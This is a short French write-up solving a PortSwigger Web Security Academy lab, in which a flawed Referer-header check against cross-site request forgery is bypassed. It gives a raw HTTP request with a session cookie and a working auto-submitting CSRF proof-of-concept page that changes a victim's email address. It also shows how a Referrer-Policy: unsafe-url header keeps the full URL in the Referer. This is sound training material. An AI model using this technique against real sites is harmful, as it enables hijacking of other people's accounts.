# Lab

https://portswigger.net/web-security/csrf/bypassing-referer-based-defenses/lab-referer-validation-broken

## Solution

Sur ce lab, la fonctionnalité de changement d'adresse mail est protégée par le header `Referer`.

La vérification est faire sur le header `Referer`.

Contrairement au lab d'avant, on ne peut pas bypass ce contrôle en supprimant le header `Referer`.

En revhanche, avec cette requête, le mail est changé :

```http
POST /my-account/change-email HTTP/2
Host: 0ab5001b038d0a9580c803a3009500ba.web-security-academy.net
Cookie: session=VKvvjDf8vlnzX66BLvNHnW9wYQBMkECG
Content-Length: 25
Content-Type: application/x-www-form-urlencoded
Referer: https://exploit-0a54007e03570ad5801302d501f7009f.exploit-server.net/?https://0ab5001b038d0a9580c803a3009500ba.web-security-academy.net

email=wiener@normal.net
```

En injectant l'url du site dans le header `Referer`, on peut bypass le contrôle.

Via l'exploit server on peut créer ce POC :

```html
<html>
  <body>
    <form action="https://0ab5001b038d0a9580c803a3009500ba.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="pwned@mcdo.com" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/?https://0ab5001b038d0a9580c803a3009500ba.web-security-academy.net');
      document.forms[0].submit();
    </script>
  </body>
</html>
```

Par contre, on voit que le contrôle est bloqué parceque par défaut certains navigateurs coupent les query string dans le header `Referer`.

Pour override ce comportement et être sûr que l'URL complète est inclue dans la requête, on peut injecter le header `Referrer-Policy: unsafe-url` dans la réponse du POC.

```html
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Referrer-Policy: unsafe-url
```